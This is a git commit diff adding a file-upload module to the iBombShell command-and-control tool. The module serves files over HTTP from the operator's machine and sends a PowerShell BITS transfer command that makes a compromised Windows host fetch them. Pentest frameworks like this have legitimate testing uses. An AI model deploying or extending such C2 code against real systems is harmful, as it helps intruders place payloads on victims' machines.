57ebb48fecbb5edaf4294258e32443c2584f3383
Josue <j.encinar.87@gmail.com>
2019-02-18 10:34:48 +0100

    File upload function (first version)

--- ibombshell c2/modules/files/upload.py
+++ ibombshell c2/modules/files/upload.py
@@ -1,5 +1,9 @@
 from termcolor import colored, cprint
 from module import Module
+from os import getcwd, chdir
+from http.server import SimpleHTTPRequestHandler
+from threading import Thread
+from socketserver import TCPServer
 
 
 class CustomModule(Module):
@@ -11,11 +15,23 @@ class CustomModule(Module):
 
         # -----------name-----default_value--description--required?
         options = {"warrior": [None, "Warrior in war", True],
-                    "source": [None, "File source", True],
-                    "destination": [None, "Destination folder", True]}}
+                    "file": [None, "File source", True],
+                    "port": [9999, "Port to listen", True],
+                    "ip": [None, "Local IP (Where the file is located)", True],
+                    "directory": ["/tmp", "directory where the file to be uploaded is located", True],
+                    "destination": [None, "Destination folder", True]}
 
         # Constructor of the parent class
         super(CustomModule, self).__init__(information, options)
+    
+    def start_server(self):
+        try:
+            curdir = getcwd()
+            chdir(self.args["directory"])
+            httpd = TCPServer((self.args["ip"], int(self.args["port"]), SimpleHTTPRequestHandler)
+            httpd.serve_forever()
+        except Exception as e:
+            cprint(e, "red")
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
@@ -26,8 +42,12 @@ class CustomModule(Module):
                             [Parameter(Mandatory)]
                             [string] $destination
                         )
+                        $src = $source
+                        if (-not $src.contains('http://')) {
+                            $src = 'http://' + $src
+                        }
                         try{    
-                            Start-BitsTransfer -Source $source -Destination $destination
+                            Start-BitsTransfer -Source $src -Destination $destination
                         } catch {
                              
                         }
@@ -35,5 +55,7 @@ class CustomModule(Module):
                     }
             """
 
-        function += 'upload -source' + self.args["source"] + ' -destination ' + self.args["destination"]
+        function += 'upload -source ' + self.args["ip"] + ":" + str(self.args["port"]) + "/" + self.args["file"] + ' -destination ' + self.args["destination"]
+        listener = Thread(target=self.start_server)
+        listener.start()
         super(CustomModule, self).run(function)
